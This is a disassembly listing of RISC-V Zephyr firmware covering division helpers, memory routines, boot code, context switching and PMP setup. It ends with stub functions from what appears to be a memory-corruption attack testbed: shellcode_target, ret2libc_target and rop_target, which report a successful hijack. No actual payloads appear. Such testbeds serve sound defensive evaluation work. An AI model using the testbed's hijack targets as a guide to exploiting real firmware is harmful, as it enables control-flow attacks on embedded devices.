80000566:	00d7f363          	bgeu	a5,a3,8000056c <__umoddi3+0xa6>
8000056a:	97c2                	add	a5,a5,a6
8000056c:	8f95                	sub	a5,a5,a3
8000056e:	0117d533          	srl	a0,a5,a7
80000572:	4581                	li	a1,0
80000574:	8082                	ret
80000576:	01000337          	lui	t1,0x1000
8000057a:	46c1                	li	a3,16
8000057c:	f66668e3          	bltu	a2,t1,800004ec <__umoddi3+0x26>
80000580:	46e1                	li	a3,24
80000582:	b7ad                	j	800004ec <__umoddi3+0x26>
80000584:	4681                	li	a3,0
80000586:	ca09                	beqz	a2,80000598 <__umoddi3+0xd2>
80000588:	6741                	lui	a4,0x10
8000058a:	06e67463          	bgeu	a2,a4,800005f2 <__umoddi3+0x12c>
8000058e:	10063693          	sltiu	a3,a2,256
80000592:	0016c693          	xori	a3,a3,1
80000596:	068e                	slli	a3,a3,0x3
80000598:	00d65733          	srl	a4,a2,a3
8000059c:	98ba                	add	a7,a7,a4
8000059e:	0008c703          	lbu	a4,0(a7)
800005a2:	9736                	add	a4,a4,a3
800005a4:	02000693          	li	a3,32
800005a8:	40e688b3          	sub	a7,a3,a4
800005ac:	04e69a63          	bne	a3,a4,80000600 <__umoddi3+0x13a>
800005b0:	40c58733          	sub	a4,a1,a2
800005b4:	01085593          	srli	a1,a6,0x10
800005b8:	02b75633          	divu	a2,a4,a1
800005bc:	01081513          	slli	a0,a6,0x10
800005c0:	8141                	srli	a0,a0,0x10
800005c2:	0107d693          	srli	a3,a5,0x10
800005c6:	02b77733          	remu	a4,a4,a1
800005ca:	02a60633          	mul	a2,a2,a0
800005ce:	0742                	slli	a4,a4,0x10
800005d0:	8f55                	or	a4,a4,a3
800005d2:	00c77863          	bgeu	a4,a2,800005e2 <__umoddi3+0x11c>
800005d6:	9742                	add	a4,a4,a6
800005d8:	01076563          	bltu	a4,a6,800005e2 <__umoddi3+0x11c>
800005dc:	00c77363          	bgeu	a4,a2,800005e2 <__umoddi3+0x11c>
800005e0:	9742                	add	a4,a4,a6
800005e2:	8f11                	sub	a4,a4,a2
800005e4:	02b756b3          	divu	a3,a4,a1
800005e8:	02b77733          	remu	a4,a4,a1
800005ec:	02a686b3          	mul	a3,a3,a0
800005f0:	b795                	j	80000554 <__umoddi3+0x8e>
800005f2:	01000737          	lui	a4,0x1000
800005f6:	46c1                	li	a3,16
800005f8:	fae660e3          	bltu	a2,a4,80000598 <__umoddi3+0xd2>
800005fc:	46e1                	li	a3,24
800005fe:	bf69                	j	80000598 <__umoddi3+0xd2>
80000600:	01161833          	sll	a6,a2,a7
80000604:	00e5d6b3          	srl	a3,a1,a4
80000608:	011517b3          	sll	a5,a0,a7
8000060c:	011595b3          	sll	a1,a1,a7
80000610:	00e55733          	srl	a4,a0,a4
80000614:	01085513          	srli	a0,a6,0x10
80000618:	8f4d                	or	a4,a4,a1
8000061a:	02a6d5b3          	divu	a1,a3,a0
8000061e:	01081313          	slli	t1,a6,0x10
80000622:	01035313          	srli	t1,t1,0x10
80000626:	02a6f6b3          	remu	a3,a3,a0
8000062a:	026585b3          	mul	a1,a1,t1
8000062e:	01069613          	slli	a2,a3,0x10
80000632:	01075693          	srli	a3,a4,0x10
80000636:	8ed1                	or	a3,a3,a2
80000638:	00b6f863          	bgeu	a3,a1,80000648 <__umoddi3+0x182>
8000063c:	96c2                	add	a3,a3,a6
8000063e:	0106e563          	bltu	a3,a6,80000648 <__umoddi3+0x182>
80000642:	00b6f363          	bgeu	a3,a1,80000648 <__umoddi3+0x182>
80000646:	96c2                	add	a3,a3,a6
80000648:	8e8d                	sub	a3,a3,a1
8000064a:	02a6d633          	divu	a2,a3,a0
8000064e:	0742                	slli	a4,a4,0x10
80000650:	8341                	srli	a4,a4,0x10
80000652:	02a6f6b3          	remu	a3,a3,a0
80000656:	02660633          	mul	a2,a2,t1
8000065a:	06c2                	slli	a3,a3,0x10
8000065c:	8f55                	or	a4,a4,a3
8000065e:	00c77863          	bgeu	a4,a2,8000066e <__umoddi3+0x1a8>
80000662:	9742                	add	a4,a4,a6
80000664:	01076563          	bltu	a4,a6,8000066e <__umoddi3+0x1a8>
80000668:	00c77363          	bgeu	a4,a2,8000066e <__umoddi3+0x1a8>
8000066c:	9742                	add	a4,a4,a6
8000066e:	8f11                	sub	a4,a4,a2
80000670:	b791                	j	800005b4 <__umoddi3+0xee>
80000672:	16d5ed63          	bltu	a1,a3,800007ec <__umoddi3+0x326>
80000676:	6841                	lui	a6,0x10
80000678:	0506f763          	bgeu	a3,a6,800006c6 <__umoddi3+0x200>
8000067c:	1006b813          	sltiu	a6,a3,256
80000680:	00184813          	xori	a6,a6,1
80000684:	080e                	slli	a6,a6,0x3
80000686:	800078b7          	lui	a7,0x80007
8000068a:	0106d333          	srl	t1,a3,a6
8000068e:	12088893          	addi	a7,a7,288 # 80007120 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007121>
80000692:	989a                	add	a7,a7,t1
80000694:	0008c883          	lbu	a7,0(a7)
80000698:	02000313          	li	t1,32
8000069c:	98c2                	add	a7,a7,a6
8000069e:	41130833          	sub	a6,t1,a7
800006a2:	03131963          	bne	t1,a7,800006d4 <__umoddi3+0x20e>
800006a6:	00b6e463          	bltu	a3,a1,800006ae <__umoddi3+0x1e8>
800006aa:	00c56b63          	bltu	a0,a2,800006c0 <__umoddi3+0x1fa>
800006ae:	40c50633          	sub	a2,a0,a2
800006b2:	40d586b3          	sub	a3,a1,a3
800006b6:	00c53733          	sltu	a4,a0,a2
800006ba:	87b2                	mv	a5,a2
800006bc:	40e68733          	sub	a4,a3,a4
800006c0:	853e                	mv	a0,a5
800006c2:	85ba                	mv	a1,a4
800006c4:	8082                	ret
800006c6:	010008b7          	lui	a7,0x1000
800006ca:	4841                	li	a6,16
800006cc:	fb16ede3          	bltu	a3,a7,80000686 <__umoddi3+0x1c0>
800006d0:	4861                	li	a6,24
800006d2:	bf55                	j	80000686 <__umoddi3+0x1c0>
800006d4:	011657b3          	srl	a5,a2,a7
800006d8:	010696b3          	sll	a3,a3,a6
800006dc:	8edd                	or	a3,a3,a5
800006de:	0115d733          	srl	a4,a1,a7
800006e2:	0106de13          	srli	t3,a3,0x10
800006e6:	03c75f33          	divu	t5,a4,t3
800006ea:	01069313          	slli	t1,a3,0x10
800006ee:	01035313          	srli	t1,t1,0x10
800006f2:	010597b3          	sll	a5,a1,a6
800006f6:	011555b3          	srl	a1,a0,a7
800006fa:	8ddd                	or	a1,a1,a5
800006fc:	0105d793          	srli	a5,a1,0x10
80000700:	01061633          	sll	a2,a2,a6
80000704:	01051533          	sll	a0,a0,a6
80000708:	03c77733          	remu	a4,a4,t3
8000070c:	03e30eb3          	mul	t4,t1,t5
80000710:	0742                	slli	a4,a4,0x10
80000712:	8fd9                	or	a5,a5,a4
80000714:	877a                	mv	a4,t5
80000716:	01d7fc63          	bgeu	a5,t4,8000072e <__umoddi3+0x268>
8000071a:	97b6                	add	a5,a5,a3
8000071c:	ffff0713          	addi	a4,t5,-1
80000720:	00d7e763          	bltu	a5,a3,8000072e <__umoddi3+0x268>
80000724:	01d7f563          	bgeu	a5,t4,8000072e <__umoddi3+0x268>
80000728:	ffef0713          	addi	a4,t5,-2
8000072c:	97b6                	add	a5,a5,a3
8000072e:	41d787b3          	sub	a5,a5,t4
80000732:	03c7deb3          	divu	t4,a5,t3
80000736:	05c2                	slli	a1,a1,0x10
80000738:	81c1                	srli	a1,a1,0x10
8000073a:	03c7f7b3          	remu	a5,a5,t3
8000073e:	8e76                	mv	t3,t4
80000740:	03d30333          	mul	t1,t1,t4
80000744:	07c2                	slli	a5,a5,0x10
80000746:	8ddd                	or	a1,a1,a5
80000748:	0065fc63          	bgeu	a1,t1,80000760 <__umoddi3+0x29a>
8000074c:	95b6                	add	a1,a1,a3
8000074e:	fffe8e13          	addi	t3,t4,-1
80000752:	00d5e763          	bltu	a1,a3,80000760 <__umoddi3+0x29a>
80000756:	0065f563          	bgeu	a1,t1,80000760 <__umoddi3+0x29a>
8000075a:	ffee8e13          	addi	t3,t4,-2
8000075e:	95b6                	add	a1,a1,a3
80000760:	01071793          	slli	a5,a4,0x10
80000764:	6f41                	lui	t5,0x10
80000766:	01c7e7b3          	or	a5,a5,t3
8000076a:	406585b3          	sub	a1,a1,t1
8000076e:	ffff0313          	addi	t1,t5,-1 # ffff <__rom_region_size+0x6fff>
80000772:	0067f733          	and	a4,a5,t1
80000776:	01065e13          	srli	t3,a2,0x10
8000077a:	83c1                	srli	a5,a5,0x10
8000077c:	00667333          	and	t1,a2,t1
80000780:	02670eb3          	mul	t4,a4,t1
80000784:	02678333          	mul	t1,a5,t1
80000788:	03c70733          	mul	a4,a4,t3
8000078c:	03c787b3          	mul	a5,a5,t3
80000790:	00670e33          	add	t3,a4,t1
80000794:	010ed713          	srli	a4,t4,0x10
80000798:	9772                	add	a4,a4,t3
8000079a:	00677363          	bgeu	a4,t1,800007a0 <__umoddi3+0x2da>
8000079e:	97fa                	add	a5,a5,t5
800007a0:	01075313          	srli	t1,a4,0x10
800007a4:	979a                	add	a5,a5,t1
800007a6:	6341                	lui	t1,0x10
800007a8:	137d                	addi	t1,t1,-1 # ffff <__rom_region_size+0x6fff>
800007aa:	00677733          	and	a4,a4,t1
800007ae:	0742                	slli	a4,a4,0x10
800007b0:	006efeb3          	and	t4,t4,t1
800007b4:	9776                	add	a4,a4,t4
800007b6:	00f5e663          	bltu	a1,a5,800007c2 <__umoddi3+0x2fc>
800007ba:	00f59b63          	bne	a1,a5,800007d0 <__umoddi3+0x30a>
800007be:	00e57963          	bgeu	a0,a4,800007d0 <__umoddi3+0x30a>
800007c2:	40c70633          	sub	a2,a4,a2
800007c6:	00c73333          	sltu	t1,a4,a2
800007ca:	969a                	add	a3,a3,t1
800007cc:	8732                	mv	a4,a2
800007ce:	8f95                	sub	a5,a5,a3
800007d0:	40e50733          	sub	a4,a0,a4
800007d4:	00e53533          	sltu	a0,a0,a4
800007d8:	8d9d                	sub	a1,a1,a5
800007da:	8d89                	sub	a1,a1,a0
800007dc:	011598b3          	sll	a7,a1,a7
800007e0:	01075733          	srl	a4,a4,a6
800007e4:	00e8e533          	or	a0,a7,a4
800007e8:	0105d5b3          	srl	a1,a1,a6
800007ec:	8082                	ret

800007ee <memcpy>:
800007ee:	832a                	mv	t1,a0
800007f0:	ca09                	beqz	a2,80000802 <memcpy+0x14>
800007f2:	00058383          	lb	t2,0(a1)
800007f6:	00730023          	sb	t2,0(t1)
800007fa:	167d                	addi	a2,a2,-1
800007fc:	0305                	addi	t1,t1,1
800007fe:	0585                	addi	a1,a1,1
80000800:	fa6d                	bnez	a2,800007f2 <memcpy+0x4>
80000802:	8082                	ret

80000804 <memset>:
80000804:	832a                	mv	t1,a0
80000806:	c611                	beqz	a2,80000812 <memset+0xe>
80000808:	00b30023          	sb	a1,0(t1)
8000080c:	167d                	addi	a2,a2,-1
8000080e:	0305                	addi	t1,t1,1
80000810:	fe65                	bnez	a2,80000808 <memset+0x4>
80000812:	8082                	ret

80000814 <setjmp>:
80000814:	00152023          	sw	ra,0(a0)
80000818:	c140                	sw	s0,4(a0)
8000081a:	c504                	sw	s1,8(a0)
8000081c:	01252623          	sw	s2,12(a0)
80000820:	01352823          	sw	s3,16(a0)
80000824:	01452a23          	sw	s4,20(a0)
80000828:	01552c23          	sw	s5,24(a0)
8000082c:	01652e23          	sw	s6,28(a0)
80000830:	03752023          	sw	s7,32(a0)
80000834:	03852223          	sw	s8,36(a0)
80000838:	03952423          	sw	s9,40(a0)
8000083c:	03a52623          	sw	s10,44(a0)
80000840:	03b52823          	sw	s11,48(a0)
80000844:	02252a23          	sw	sp,52(a0)
80000848:	4501                	li	a0,0
8000084a:	8082                	ret

8000084c <longjmp>:
8000084c:	00052083          	lw	ra,0(a0)
80000850:	4140                	lw	s0,4(a0)
80000852:	4504                	lw	s1,8(a0)
80000854:	00c52903          	lw	s2,12(a0)
80000858:	01052983          	lw	s3,16(a0)
8000085c:	01452a03          	lw	s4,20(a0)
80000860:	01852a83          	lw	s5,24(a0)
80000864:	01c52b03          	lw	s6,28(a0)
80000868:	02052b83          	lw	s7,32(a0)
8000086c:	02452c03          	lw	s8,36(a0)
80000870:	02852c83          	lw	s9,40(a0)
80000874:	02c52d03          	lw	s10,44(a0)
80000878:	03052d83          	lw	s11,48(a0)
8000087c:	03452103          	lw	sp,52(a0)
80000880:	0015b513          	seqz	a0,a1
80000884:	952e                	add	a0,a0,a1
80000886:	8082                	ret

80000888 <memmove>:
80000888:	c215                	beqz	a2,800008ac <memmove+0x24>
8000088a:	832a                	mv	t1,a0
8000088c:	4685                	li	a3,1
8000088e:	00b56763          	bltu	a0,a1,8000089c <memmove+0x14>
80000892:	56fd                	li	a3,-1
80000894:	fff60713          	addi	a4,a2,-1
80000898:	933a                	add	t1,t1,a4
8000089a:	95ba                	add	a1,a1,a4
8000089c:	00058383          	lb	t2,0(a1)
800008a0:	00730023          	sb	t2,0(t1)
800008a4:	167d                	addi	a2,a2,-1
800008a6:	9336                	add	t1,t1,a3
800008a8:	95b6                	add	a1,a1,a3
800008aa:	fa6d                	bnez	a2,8000089c <memmove+0x14>
800008ac:	8082                	ret
	...

800008b0 <__initialize>:
/*
 * Remainder of asm-land initialization code before we can jump into
 * the C domain
 */
SECTION_FUNC(TEXT, __initialize)
	csrr a0, mhartid
800008b0:	f1402573          	csrr	a0,mhartid
	beqz a0, boot_first_core
800008b4:	c519                	beqz	a0,800008c2 <boot_first_core>

	li t0, CONFIG_MP_NUM_CPUS
800008b6:	4285                	li	t0,1
	blt a0, t0, boot_secondary_core
800008b8:	02554c63          	blt	a0,t0,800008f0 <boot_secondary_core>

800008bc <loop_unconfigured_cores>:

loop_unconfigured_cores:
	wfi
800008bc:	10500073          	wfi
	j loop_unconfigured_cores
800008c0:	bff5                	j	800008bc <loop_unconfigured_cores>

800008c2 <boot_first_core>:
	fscsr zero
#endif

#ifdef CONFIG_INIT_STACKS
	/* Pre-populate all bytes in z_interrupt_stacks with 0xAA */
	la t0, z_interrupt_stacks
800008c2:	00009297          	auipc	t0,0x9
800008c6:	c8e28293          	addi	t0,t0,-882 # 80009550 <z_interrupt_stacks>
	li t1, __z_interrupt_stack_SIZEOF
800008ca:	6305                	lui	t1,0x1
	add t1, t1, t0
800008cc:	9316                	add	t1,t1,t0

	/* Populate z_interrupt_stacks with 0xaaaaaaaa */
	li t2, 0xaaaaaaaa
800008ce:	aaaab3b7          	lui	t2,0xaaaab
800008d2:	aaa38393          	addi	t2,t2,-1366 # aaaaaaaa <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xaaaaaaab>

800008d6 <aa_loop>:
aa_loop:
	sw t2, 0x00(t0)
800008d6:	0072a023          	sw	t2,0(t0)
	addi t0, t0, 4
800008da:	0291                	addi	t0,t0,4
	blt t0, t1, aa_loop
800008dc:	fe62cde3          	blt	t0,t1,800008d6 <aa_loop>

	/*
	 * Initially, setup stack pointer to
	 * z_interrupt_stacks + __z_interrupt_stack_SIZEOF
	 */
	la sp, z_interrupt_stacks
800008e0:	00009117          	auipc	sp,0x9
800008e4:	c7010113          	addi	sp,sp,-912 # 80009550 <z_interrupt_stacks>
	li t0, __z_interrupt_stack_SIZEOF
800008e8:	6285                	lui	t0,0x1
	add sp, sp, t0
800008ea:	9116                	add	sp,sp,t0

	/*
	 * Jump into C domain. _PrepC zeroes BSS, copies rw data into RAM,
	 * and then enters kernel z_cstart
	 */
	call _PrepC
800008ec:	28b020ef          	jal	ra,80003376 <_PrepC>

800008f0 <boot_secondary_core>:

boot_secondary_core:
	la t0, riscv_cpu_wake_flag
800008f0:	00008297          	auipc	t0,0x8
800008f4:	73428293          	addi	t0,t0,1844 # 80009024 <riscv_cpu_wake_flag>
	lr t0, 0(t0)
800008f8:	0002a283          	lw	t0,0(t0)
	bne a0, t0, boot_secondary_core
800008fc:	fe551ae3          	bne	a0,t0,800008f0 <boot_secondary_core>

	/* Set up stack */
	la t0, riscv_cpu_sp
80000900:	00008297          	auipc	t0,0x8
80000904:	72028293          	addi	t0,t0,1824 # 80009020 <riscv_cpu_sp>
	lr sp, 0(t0)
80000908:	0002a103          	lw	sp,0(t0)

	la t0, riscv_cpu_wake_flag
8000090c:	00008297          	auipc	t0,0x8
80000910:	71828293          	addi	t0,t0,1816 # 80009024 <riscv_cpu_wake_flag>
	sr zero, 0(t0)
80000914:	0002a023          	sw	zero,0(t0)
	j z_riscv_secondary_cpu_init
80000918:	2790206f          	j	80003390 <z_riscv_secondary_cpu_init>
8000091c:	0000                	unimp
	...

80000920 <z_riscv_switch>:

/* void z_riscv_switch(k_thread_t *switch_to, k_thread_t *switch_from) */
SECTION_FUNC(TEXT, z_riscv_switch)

	/* Save the old thread's callee-saved registers */
	DO_CALLEE_SAVED(sr, a1)
80000920:	0215aa23          	sw	ra,52(a1)
80000924:	dd80                	sw	s0,56(a1)
80000926:	ddc4                	sw	s1,60(a1)
80000928:	0525a023          	sw	s2,64(a1)
8000092c:	0535a223          	sw	s3,68(a1)
80000930:	0545a423          	sw	s4,72(a1)
80000934:	0555a623          	sw	s5,76(a1)
80000938:	0565a823          	sw	s6,80(a1)
8000093c:	0575aa23          	sw	s7,84(a1)
80000940:	0585ac23          	sw	s8,88(a1)
80000944:	0595ae23          	sw	s9,92(a1)
80000948:	07a5a023          	sw	s10,96(a1)
8000094c:	07b5a223          	sw	s11,100(a1)
	DO_FP_CALLEE_SAVED(fsr, a1)
skip_store_fp_callee_saved:
#endif /* CONFIG_FPU && CONFIG_FPU_SHARING */

	/* Save the old thread's stack pointer */
	sr sp, _thread_offset_to_sp(a1)
80000950:	0225a823          	sw	sp,48(a1)

	/* Set thread->switch_handle = thread to mark completion */
	sr a1, ___thread_t_switch_handle_OFFSET(a1)
80000954:	08b5a223          	sw	a1,132(a1)

	/* Get the new thread's stack pointer */
	lr sp, _thread_offset_to_sp(a0)
80000958:	03052103          	lw	sp,48(a0)

#if defined(CONFIG_THREAD_LOCAL_STORAGE)
	/* Get the new thread's tls pointer */
	lr tp, _thread_offset_to_tls(a0)
8000095c:	08c52203          	lw	tp,140(a0)
	call z_thread_mark_switched_in
	mv a0, s0
#endif

	/* Restore the new thread's callee-saved registers */
	DO_CALLEE_SAVED(lr, a0)
80000960:	03452083          	lw	ra,52(a0)
80000964:	5d00                	lw	s0,56(a0)
80000966:	5d44                	lw	s1,60(a0)
80000968:	04052903          	lw	s2,64(a0)
8000096c:	04452983          	lw	s3,68(a0)
80000970:	04852a03          	lw	s4,72(a0)
80000974:	04c52a83          	lw	s5,76(a0)
80000978:	05052b03          	lw	s6,80(a0)
8000097c:	05452b83          	lw	s7,84(a0)
80000980:	05852c03          	lw	s8,88(a0)
80000984:	05c52c83          	lw	s9,92(a0)
80000988:	06052d03          	lw	s10,96(a0)
8000098c:	06452d83          	lw	s11,100(a0)
	csrc mstatus, t1
1:
#endif /* CONFIG_FPU && CONFIG_FPU_SHARING */

	/* Return to arch_switch() or _irq_wrapper() */
	ret
80000990:	8082                	ret
	...

80000994 <z_riscv_write_pmp_entries>:
 */

GTEXT(z_riscv_write_pmp_entries)
SECTION_FUNC(TEXT, z_riscv_write_pmp_entries)

	la t0, pmpaddr_store
80000994:	00000297          	auipc	t0,0x0
80000998:	01028293          	addi	t0,t0,16 # 800009a4 <pmpaddr_store>
	slli t1, a0, 4  /* 16-byte instruction blocks */
8000099c:	00451313          	slli	t1,a0,0x4
	add t0, t0, t1
800009a0:	929a                	add	t0,t0,t1
	jr t0
800009a2:	8282                	jr	t0

800009a4 <pmpaddr_store>:
	lr t0, (RV_REGSIZE * _index)(a3)
	li t1, _index + 1
	csrw (CSR_PMPADDR_BASE + _index), t0
	beq t1, a1, pmpaddr_done
	.set _index, _index + 1
	.endr
800009a4:	0006a283          	lw	t0,0(a3) # 10000 <__rom_region_size+0x7000>
800009a8:	00100313          	li	t1,1
800009ac:	3b029073          	csrw	pmpaddr0,t0
800009b0:	0eb30a63          	beq	t1,a1,80000aa4 <pmpaddr_done>
800009b4:	0046a283          	lw	t0,4(a3)
800009b8:	00200313          	li	t1,2
800009bc:	3b129073          	csrw	pmpaddr1,t0
800009c0:	0eb30263          	beq	t1,a1,80000aa4 <pmpaddr_done>
800009c4:	0086a283          	lw	t0,8(a3)
800009c8:	00300313          	li	t1,3
800009cc:	3b229073          	csrw	pmpaddr2,t0
800009d0:	0cb30a63          	beq	t1,a1,80000aa4 <pmpaddr_done>
800009d4:	00c6a283          	lw	t0,12(a3)
800009d8:	00400313          	li	t1,4
800009dc:	3b329073          	csrw	pmpaddr3,t0
800009e0:	0cb30263          	beq	t1,a1,80000aa4 <pmpaddr_done>
800009e4:	0106a283          	lw	t0,16(a3)
800009e8:	00500313          	li	t1,5
800009ec:	3b429073          	csrw	pmpaddr4,t0
800009f0:	0ab30a63          	beq	t1,a1,80000aa4 <pmpaddr_done>
800009f4:	0146a283          	lw	t0,20(a3)
800009f8:	00600313          	li	t1,6
800009fc:	3b529073          	csrw	pmpaddr5,t0
80000a00:	0ab30263          	beq	t1,a1,80000aa4 <pmpaddr_done>
80000a04:	0186a283          	lw	t0,24(a3)
80000a08:	00700313          	li	t1,7
80000a0c:	3b629073          	csrw	pmpaddr6,t0
80000a10:	08b30a63          	beq	t1,a1,80000aa4 <pmpaddr_done>
80000a14:	01c6a283          	lw	t0,28(a3)
80000a18:	00800313          	li	t1,8
80000a1c:	3b729073          	csrw	pmpaddr7,t0
80000a20:	08b30263          	beq	t1,a1,80000aa4 <pmpaddr_done>
80000a24:	0206a283          	lw	t0,32(a3)
80000a28:	00900313          	li	t1,9
80000a2c:	3b829073          	csrw	pmpaddr8,t0
80000a30:	06b30a63          	beq	t1,a1,80000aa4 <pmpaddr_done>
80000a34:	0246a283          	lw	t0,36(a3)
80000a38:	00a00313          	li	t1,10
80000a3c:	3b929073          	csrw	pmpaddr9,t0
80000a40:	06b30263          	beq	t1,a1,80000aa4 <pmpaddr_done>
80000a44:	0286a283          	lw	t0,40(a3)
80000a48:	00b00313          	li	t1,11
80000a4c:	3ba29073          	csrw	pmpaddr10,t0
80000a50:	04b30a63          	beq	t1,a1,80000aa4 <pmpaddr_done>
80000a54:	02c6a283          	lw	t0,44(a3)
80000a58:	00c00313          	li	t1,12
80000a5c:	3bb29073          	csrw	pmpaddr11,t0
80000a60:	04b30263          	beq	t1,a1,80000aa4 <pmpaddr_done>
80000a64:	0306a283          	lw	t0,48(a3)
80000a68:	00d00313          	li	t1,13
80000a6c:	3bc29073          	csrw	pmpaddr12,t0
80000a70:	02b30a63          	beq	t1,a1,80000aa4 <pmpaddr_done>
80000a74:	0346a283          	lw	t0,52(a3)
80000a78:	00e00313          	li	t1,14
80000a7c:	3bd29073          	csrw	pmpaddr13,t0
80000a80:	02b30263          	beq	t1,a1,80000aa4 <pmpaddr_done>
80000a84:	0386a283          	lw	t0,56(a3)
80000a88:	00f00313          	li	t1,15
80000a8c:	3be29073          	csrw	pmpaddr14,t0
80000a90:	00b30a63          	beq	t1,a1,80000aa4 <pmpaddr_done>
80000a94:	03c6a283          	lw	t0,60(a3)
80000a98:	01000313          	li	t1,16
80000a9c:	3bf29073          	csrw	pmpaddr15,t0
80000aa0:	00b30263          	beq	t1,a1,80000aa4 <pmpaddr_done>

80000aa4 <pmpaddr_done>:
	/*
	 * Move to the pmpcfg space:
	 * a0 = a0 / RV_REGSIZE
	 * a1 = (a1 + RV_REGSIZE - 1) / RV_REGSIZE
	 */
	la t0, pmpcfg_store
80000aa4:	00000297          	auipc	t0,0x0
80000aa8:	01628293          	addi	t0,t0,22 # 80000aba <pmpcfg_store>
	srli a0, a0, RV_REGSHIFT
80000aac:	8109                	srli	a0,a0,0x2
	slli t1, a0, 4  /* 16-byte instruction blocks */
80000aae:	00451313          	slli	t1,a0,0x4
	add t0, t0, t1
80000ab2:	929a                	add	t0,t0,t1
	addi a1, a1, RV_REGSIZE - 1
80000ab4:	058d                	addi	a1,a1,3
	srli a1, a1, RV_REGSHIFT
80000ab6:	8189                	srli	a1,a1,0x2
	jr t0
80000ab8:	8282                	jr	t0

80000aba <pmpcfg_store>:
	lr t0, (RV_REGSIZE * _index)(a4)
	addi a0, a0, 1
	csrw (CSR_PMPCFG_BASE + RV_REGSIZE/4 * _index), t0
	beq a0, a1, pmpcfg_done
	.set _index, _index + 1
	.endr
80000aba:	00072283          	lw	t0,0(a4) # 1000000 <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0x676980>
80000abe:	00150513          	addi	a0,a0,1
80000ac2:	3a029073          	csrw	pmpcfg0,t0
80000ac6:	02b50a63          	beq	a0,a1,80000afa <pmpcfg_done>
80000aca:	00472283          	lw	t0,4(a4)
80000ace:	00150513          	addi	a0,a0,1
80000ad2:	3a129073          	csrw	pmpcfg1,t0
80000ad6:	02b50263          	beq	a0,a1,80000afa <pmpcfg_done>
80000ada:	00872283          	lw	t0,8(a4)
80000ade:	00150513          	addi	a0,a0,1
80000ae2:	3a229073          	csrw	pmpcfg2,t0
80000ae6:	00b50a63          	beq	a0,a1,80000afa <pmpcfg_done>
80000aea:	00c72283          	lw	t0,12(a4)
80000aee:	00150513          	addi	a0,a0,1
80000af2:	3a329073          	csrw	pmpcfg3,t0
80000af6:	00b50263          	beq	a0,a1,80000afa <pmpcfg_done>

80000afa <pmpcfg_done>:
	.option pop

pmpcfg_done:

	beqz a2, done
80000afa:	c205                	beqz	a2,80000b1a <done>

	la t0, pmpcfg_zerotail
80000afc:	00000297          	auipc	t0,0x0
80000b00:	00e28293          	addi	t0,t0,14 # 80000b0a <pmpcfg_zerotail>
	slli a0, a0, 2  /* 4-byte instruction blocks */
80000b04:	050a                	slli	a0,a0,0x2
	add t0, t0, a0
80000b06:	92aa                	add	t0,t0,a0
	jr t0
80000b08:	8282                	jr	t0

80000b0a <pmpcfg_zerotail>:
	.option norvc
	.set _index, 0
	.rept (CONFIG_PMP_SLOTS / RV_REGSIZE)
	csrw (CSR_PMPCFG_BASE + RV_REGSIZE/4 * _index), zero
	.set _index, _index + 1
	.endr
80000b0a:	3a001073          	csrw	pmpcfg0,zero
80000b0e:	3a101073          	csrw	pmpcfg1,zero
80000b12:	3a201073          	csrw	pmpcfg2,zero
80000b16:	3a301073          	csrw	pmpcfg3,zero

80000b1a <done>:
	.option pop

done:	ret
80000b1a:	8082                	ret
	...

80000b1e <dummy_function>:
void set_inject_param(char *choice);
void set_code_ptr(char *choice);
void set_location(char *choice);
void set_function(char *choice);

int dummy_function(const char *str) {
80000b1e:	1101                	addi	sp,sp,-32
80000b20:	ce06                	sw	ra,28(sp)
80000b22:	cc22                	sw	s0,24(sp)
80000b24:	8000c437          	lui	s0,0x8000c
80000b28:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000b2c:	c63e                	sw	a5,12(sp)
80000b2e:	4781                	li	a5,0
        printf("Dummy function\n");
80000b30:	80007537          	lui	a0,0x80007
80000b34:	22050513          	addi	a0,a0,544 # 80007220 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007221>
80000b38:	099010ef          	jal	ra,800023d0 <printk>
        return 0;
}
80000b3c:	4732                	lw	a4,12(sp)
80000b3e:	95042783          	lw	a5,-1712(s0)
80000b42:	8fb9                	xor	a5,a5,a4
80000b44:	4701                	li	a4,0
80000b46:	e791                	bnez	a5,80000b52 <dummy_function+0x34>
80000b48:	4501                	li	a0,0
80000b4a:	40f2                	lw	ra,28(sp)
80000b4c:	4462                	lw	s0,24(sp)
80000b4e:	6105                	addi	sp,sp,32
80000b50:	8082                	ret
80000b52:	1a0050ef          	jal	ra,80005cf2 <_StackCheckHandler>

80000b56 <shellcode_target>:
    }
}

void
shellcode_target()
{
80000b56:	1101                	addi	sp,sp,-32
80000b58:	ce06                	sw	ra,28(sp)
80000b5a:	8000c7b7          	lui	a5,0x8000c
80000b5e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000b62:	c63a                	sw	a4,12(sp)
80000b64:	4701                	li	a4,0
    printf("success.\nCode injection function reached.\n");
80000b66:	80007537          	lui	a0,0x80007
80000b6a:	23050513          	addi	a0,a0,560 # 80007230 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007231>
80000b6e:	063010ef          	jal	ra,800023d0 <printk>
    exit(0);
80000b72:	4501                	li	a0,0
80000b74:	6e8050ef          	jal	ra,8000625c <exit>

80000b78 <ret2libc_target>:
}

void
ret2libc_target()
{
80000b78:	1101                	addi	sp,sp,-32
80000b7a:	ce06                	sw	ra,28(sp)
80000b7c:	8000c7b7          	lui	a5,0x8000c
80000b80:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000b84:	c63a                	sw	a4,12(sp)
80000b86:	4701                	li	a4,0
    printf("success.\nRet2Libc function reached.\n");
80000b88:	80007537          	lui	a0,0x80007
80000b8c:	25c50513          	addi	a0,a0,604 # 8000725c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000725d>
80000b90:	041010ef          	jal	ra,800023d0 <printk>
    exit(0);
80000b94:	4501                	li	a0,0
80000b96:	6c6050ef          	jal	ra,8000625c <exit>

80000b9a <rop_target>:
    }
}

void
rop_target()
{
80000b9a:	1101                	addi	sp,sp,-32
80000b9c:	ce06                	sw	ra,28(sp)
80000b9e:	8000c7b7          	lui	a5,0x8000c
80000ba2:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
